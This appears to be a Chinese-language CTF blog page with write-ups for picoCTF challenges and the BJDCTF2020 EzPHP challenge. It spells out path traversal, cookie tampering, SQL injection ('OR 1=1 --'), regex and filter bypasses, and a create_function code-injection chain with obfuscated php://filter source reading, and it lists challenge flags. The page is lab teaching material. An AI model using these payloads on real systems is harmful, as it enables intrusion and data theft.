class="number">0x0b</span>) + <span class="built_in">chr</span>(<span class="number">0x43</span>) + <span class="built_in">chr</span>(<span class="number">0x0b</span>) + <span class="built_in">chr</span>(<span class="number">0x5e</span>) + <span class="built_in">chr</span>(<span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_flag</span>():</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    codebook = <span class="built_in">open</span>(<span class="string">&#x27;codebook.txt&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>).read() </span><br><span class="line">    password = codebook[<span class="number">4</span>] + codebook[<span class="number">14</span>] + codebook[<span class="number">13</span>] + codebook[<span class="number">14</span>] +\</span><br><span class="line">               codebook[<span class="number">23</span>]+ codebook[<span class="number">25</span>] + codebook[<span class="number">16</span>] + codebook[<span class="number">0</span>]  +\</span><br><span class="line">               codebook[<span class="number">25</span>]</span><br><span class="line">               </span><br><span class="line">    flag = str_xor(flag_enc, password)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">  <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Couldn\&#x27;t find codebook.txt. Did you download that file into the same directory as this script?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  print_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<p>将code.py内的字符串和codebook中的字符串异或后得出flag</p>
<h5 id="hashjobapp"><a href="#hashjobapp" class="headerlink" title="hashjobapp"></a>hashjobapp</h5><p>对使用<code>nc</code>有了初步理解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc saturn.picoctf.net 54555</span><br></pre></td></tr></table></figure>
<p>使用cyberchef的MD5功能进行加密<br>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Please md5 hash the text between quotes, excluding the quotes: &#x27;Microsoft&#x27;</span><br><span class="line">Answer: </span><br><span class="line">140864078aeca1c7c35b4beb33c53c34</span><br><span class="line">140864078aeca1c7c35b4beb33c53c34</span><br><span class="line">Correct.</span><br><span class="line">Please md5 hash the text between quotes, excluding the quotes: &#x27;Muhammad Ali&#x27;</span><br><span class="line">Answer: </span><br><span class="line">81d1d45dbb19a90fdfae4f87865b136a</span><br><span class="line">81d1d45dbb19a90fdfae4f87865b136a</span><br><span class="line">Correct.</span><br><span class="line">Please md5 hash the text between quotes, excluding the quotes: &#x27;Al Pacino&#x27;</span><br><span class="line">Answer: </span><br><span class="line">1c9909508d984c65fb3a2f3b28d27faf</span><br><span class="line">1c9909508d984c65fb3a2f3b28d27faf</span><br><span class="line">Correct.</span><br><span class="line">picoCTF&#123;4ppl1c4710n_r3c31v3d_674c1de2&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Glich-cat"><a href="#Glich-cat" class="headerlink" title="Glich cat"></a>Glich cat</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 57330</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;gl17ch_m3_n07_&#x27; + chr(0x62) + chr(0x65) + chr(0x63) + chr(0x66) + chr(0x33) + chr(0x38) + chr(0x36) + chr(0x31) + &#x27;&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p>解码得到flag后半段</p>
<h2 id="picoctf"><a href="#picoctf" class="headerlink" title="picoctf"></a>picoctf</h2><h3 id="Includes"><a href="#Includes" class="headerlink" title="Includes"></a>Includes</h3><p>flag前后两段在js模块中<br>直接获得flag拼接</p>
<h3 id="Inspect-HTML"><a href="#Inspect-HTML" class="headerlink" title="Inspect HTML"></a>Inspect HTML</h3><p>f12直接获得flag</p>
<h3 id="Local-Authority"><a href="#Local-Authority" class="headerlink" title="Local Authority"></a>Local Authority</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkPassword(username, password)</span><br><span class="line">&#123;</span><br><span class="line">  if( username === &#x27;admin&#x27; &amp;&amp; password === &#x27;strongPassword098765&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>前端js密码检测<br>密码明文暴露<br>登录admin账号后获得flag</p>
<h3 id="Search-source"><a href="#Search-source" class="headerlink" title="Search source"></a>Search source</h3><p>flag存储在某个资源中<br>使用wget获取网页全部资源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -m http://saturn.picoctf.net:61941/  </span><br></pre></td></tr></table></figure>
<p>使用grep搜索flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;CTF&quot; -n </span><br><span class="line">css/style.css:328:/** banner_main picoCTF&#123;1nsp3ti0n_0f_w3bpag3s_8de925a7&#125; **/</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<h3 id="Forbidden-Paths"><a href="#Forbidden-Paths" class="headerlink" title="Forbidden Paths"></a>Forbidden Paths</h3><p>目录穿越<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../flag.txt</span><br></pre></td></tr></table></figure>
<h3 id="Power-Cookie"><a href="#Power-Cookie" class="headerlink" title="Power Cookie"></a>Power Cookie</h3><p>burps查看请求包<br>更改cookie值<br>成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: isAdmin=1</span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<h3 id="Roboto-Sans"><a href="#Roboto-Sans" class="headerlink" title="Roboto Sans"></a>Roboto Sans</h3><p>查看robots.txt<br>得到目标文件目录的base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/js/myfile.txt</span><br></pre></td></tr></table></figure>
<p>访问得到flag</p>
<h3 id="SQL-Direct"><a href="#SQL-Direct" class="headerlink" title="SQL Direct"></a>SQL Direct</h3><p>使用的是 PostgreSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;1nclu51v17y_1of2_f7w_2of2_b8f4b022&#125;</span><br><span class="line">pico=# select * from pg_tables;</span><br><span class="line">     schemaname     |        tablename        | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity </span><br><span class="line">--------------------+-------------------------+------------+------------+------------+----------+-------------+-------------</span><br><span class="line"> public             | flags                   | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_statistic            | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_type                 | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_foreign_table        | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_authid               | postgres   | pg_global  | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_statistic_ext_data   | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_user_mapping         | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_subscription         | postgres   | pg_global  | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_attribute            | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_proc                 | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_class                | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_attrdef              | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_constraint           | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_inherits             | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_index                | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_operator             | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_opfamily             | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_opclass              | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_am                   | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_amop                 | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_amproc               | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_language             | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_largeobject_metadata | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_aggregate            | postgres   |            | t          | f        | f           | f</span><br><span class="line"> pg_catalog         | pg_statistic_ext        | postgres   |            | t          | f        | f           | f</span><br><span class="line">:</span><br><span class="line">pico=# select * from pg_tables;</span><br><span class="line">pico=# select * from flags;</span><br><span class="line"> id | firstname | lastname  |                address                 </span><br><span class="line">----+-----------+-----------+----------------------------------------</span><br><span class="line">  1 | Luke      | Skywalker | picoCTF&#123;L3arN_S0m3_5qL_t0d4Y_21c94904&#125;</span><br><span class="line">  2 | Leia      | Organa    | Alderaan</span><br><span class="line">  3 | Han       | Solo      | Corellia</span><br><span class="line">(3 行记录)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="SQLiLite"><a href="#SQLiLite" class="headerlink" title="SQLiLite"></a>SQLiLite</h3><p>以<code>&#39;</code>封闭的sql注入<br>使用万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;OR 1=1 --</span><br></pre></td></tr></table></figure>
<p>得到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/2022-3-15/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/10/2022-3-15/" class="post-title-link" itemprop="url">2022-3-15</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-10 10:17:21" itemprop="dateCreated datePublished" datetime="2022-03-10T10:17:21+08:00">2022-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-16 18:30:28" itemprop="dateModified" datetime="2022-03-16T18:30:28+08:00">2022-03-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="BJDCTF2020-EzPHP-1"><a href="#BJDCTF2020-EzPHP-1" class="headerlink" title="[BJDCTF2020]EzPHP 1"></a>[BJDCTF2020]EzPHP 1</h2><p>打开网站，f12查看源码，得到real page</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GFXEIM3YFZYGQ4A=	#BASE32</span><br><span class="line">1nD3x.php</span><br></pre></td></tr></table></figure>
<p>获得源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="过滤一：-SERVER-QUERY-STRING-正则"><a href="#过滤一：-SERVER-QUERY-STRING-正则" class="headerlink" title="过滤一：$_SERVER[QUERY_STRING]正则"></a>过滤一：$_SERVER[QUERY_STRING]正则</h3><p><em>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</em><br><em>query string（查询字符串），如果有的话，通过它进行页面访问。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以使用url编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%70%61%73%73%77%64=1&amp;%73%68%61%6E%6E%61=1</span><br></pre></td></tr></table></figure>
<h3 id="过滤二：正则内容匹配"><a href="#过滤二：正则内容匹配" class="headerlink" title="过滤二：正则内容匹配"></a>过滤二：正则内容匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要求以<code>aqua_is_cute</code>同时为开头结尾，内容要求不同<br>使用<code>%0a</code>截断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;dedu=aqua_is_cute%0a</span><br><span class="line">&amp;%64%65%64%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a</span><br></pre></td></tr></table></figure>
<h3 id="过滤三：-REQUEST正则"><a href="#过滤三：-REQUEST正则" class="headerlink" title="过滤三：$_REQUEST正则"></a>过滤三：$_REQUEST正则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在$_requst中优先post的数据<br>在post中传入假数据绕过</p>
<h3 id="过滤四：文件匹配"><a href="#过滤四：文件匹配" class="headerlink" title="过滤四：文件匹配"></a>过滤四：文件匹配</h3><p>使用data伪协议绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,debu_debu_aqua</span><br><span class="line">%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</span><br></pre></td></tr></table></figure>
<h3 id="过滤五：sha1-碰撞"><a href="#过滤五：sha1-碰撞" class="headerlink" title="过滤五：sha1()碰撞"></a>过滤五：sha1()碰撞</h3><p>由于是强相等，使用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%70%61%73%73%77%64[]=1&amp;%73%68%61%6E%6E%61[]=11</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="extract-变量覆盖和create-function函数拼接"><a href="#extract-变量覆盖和create-function函数拼接" class="headerlink" title="extract()变量覆盖和create_function函数拼接"></a>extract()变量覆盖和create_function函数拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt; </span><br></pre></td></tr></table></figure>
<p>无法得知的code和arg值，又提供了extract，使用变量覆盖<br>ban掉了大部分直接获取文件的函数，可以使用get_defined_var()查看所有的变量和值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(get_defined_vars());// </span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot; &#125; </span><br></pre></td></tr></table></figure>
<p>无法直接获得flag<br>显然需要直接获得源码<br>使用<code>require()</code>和伪协议尝试获得，失败<br>使用<code>~</code>取反绕过<br>php取反脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a =&quot;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&quot;;</span><br><span class="line">echo &quot;~(&quot;;</span><br><span class="line">for ($i = 0; $i &lt; strlen($a); $i++) &#123;</span><br><span class="line">    echo &quot;%&quot;.bin2hex(~$a[$i]);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;)&quot;;</span><br><span class="line">require~%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f</span><br></pre></td></tr></table></figure>
<p>得到base64的源码<br>获得flag</p>
